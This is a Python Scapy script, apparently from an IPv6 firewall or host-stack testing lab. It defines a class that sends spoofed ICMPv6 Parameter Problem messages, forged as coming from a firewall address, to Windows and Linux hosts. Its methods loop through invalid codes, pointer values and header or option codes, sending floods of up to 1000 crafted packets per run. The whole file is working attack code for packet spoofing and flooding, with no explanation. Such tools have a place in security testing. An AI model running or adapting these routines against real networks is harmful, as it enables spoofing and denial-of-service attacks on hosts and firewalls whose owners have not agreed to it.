#!/usr/bin/python

from scapy.all import *

"""
the class build Parameter Problem messages
"""
class ParameterProblem:
    
    def __init__(self):
        print 'Parameter Problem'
        self.win = "2001:abcd:acad:2:b485:2aec:9447:fd83"
        self.linux = "2001:abcd:acad:2:a00:27ff:fe84:bb37"
        self.attacker = "2001:abcd:acad:1::2"
        self.firewall = "2001:abcd:acad:2::1"

    def execModuleParameterProblemBadCodeWin(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for code in range(4, 256):
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6ParamProblem(code=code)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemBadCodeLinux(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for code in range(4, 256):
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6ParamProblem(code=code)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemFloodPointerWin(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for ptr in range(0,1024):
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6ParamProblem(code=0,ptr=ptr)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemFloodPointerLinux(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for ptr in range(0, 1024):
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6ParamProblem(code=0, ptr=ptr)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemFloodHighPointerWin(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for ptr in range(3024000000,3024001000):
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6ParamProblem(code=0,ptr=ptr)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemFloodHighPointerLinux(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for ptr in range(3024000000,3024001000):
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6ParamProblem(code=0, ptr=ptr)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemErrHeaderWin(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for x in range(0,50):
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6ParamProblem(code=0)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemErrHeaderLinux(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for ptr in range(0, 50):
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6ParamProblem(code=0)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemUnrecHeaderWin(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for x in range(0, 50):
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6ParamProblem(code=1)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemUnrecHeaderLinux(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for ptr in range(0, 50):
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6ParamProblem(code=1)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemUnrecIPOptionrWin(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for x in range(0, 50):
            packetContainer = IPv6(dst=self.win,src=self.firewall)/ICMPv6ParamProblem(code=2)/IPv6(dst=self.attacker,src=self.win,hlim=128)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)

    def execModuleParameterProblemUnrecIPOptionLinux(self, exitIface):
        data = "abcdefghijklmnopqrstuvwabcdefghi"
        for ptr in range(0, 50):
            packetContainer = IPv6(dst=self.linux,src=self.firewall)/ICMPv6ParamProblem(code=2)/IPv6(dst=self.attacker,src=self.linux,hlim=64)/ICMPv6EchoRequest(id=0,seq=0)/data
            send(packetContainer, iface=exitIface, verbose=False)
